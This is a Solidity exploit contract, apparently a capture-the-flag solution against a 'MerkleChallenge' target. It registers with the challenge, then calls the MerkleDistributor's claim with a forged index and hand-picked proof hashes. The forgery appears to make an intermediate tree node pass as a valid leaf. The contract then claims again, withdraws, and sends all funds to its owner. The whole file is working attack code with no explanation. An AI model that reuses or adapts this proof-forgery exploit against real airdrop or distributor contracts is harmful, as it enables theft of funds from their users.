// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "./MerkleChallenge.sol";

contract Hack {
    MerkleChallenge challenge;
    MerkleDistributor md;

    address public owner;

    constructor() {
        challenge = MerkleChallenge(payable(0xC581011519A83C37042cA00F9e9bbe01035B80C0));
        owner = msg.sender;
    }

    receive() external payable {}

    function run() public {
        challenge.register();
        md = MerkleDistributor(challenge.merkleDistributorMap(address(this)));

        bytes32 fakeIdx = keccak256(
            abi.encodePacked(
                uint256(37), address(0x8a85e6D0d2d6b8cBCb27E724F14A97AeB7cC1f5e), uint96(0x5dacf28c4e17721edb)
            )
        );

        bytes32[] memory proofs = new bytes32[](5);
        proofs[0] = bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d);
        proofs[1] = bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde);
        proofs[2] = bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813);
        proofs[3] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);
        proofs[4] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);

        md.claim(
            uint256(fakeIdx),
            address(0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A),
            uint96(0x00000f40f0c122ae08d2207b),
            proofs
        );

        proofs = new bytes32[](6);
        proofs[0] = bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);
        proofs[1] = bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);
        proofs[2] = bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);
        proofs[3] = bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);
        proofs[4] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);
        proofs[5] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);

        md.claim(8, address(0x249934e4C5b838F920883a9f3ceC255C0aB3f827), uint96(0xa0d154c64a300ddf85), proofs);

        assert(challenge.isSolved(address(md)));
        challenge.withdraw();
        payable(owner).transfer(address(this).balance);
    }
}
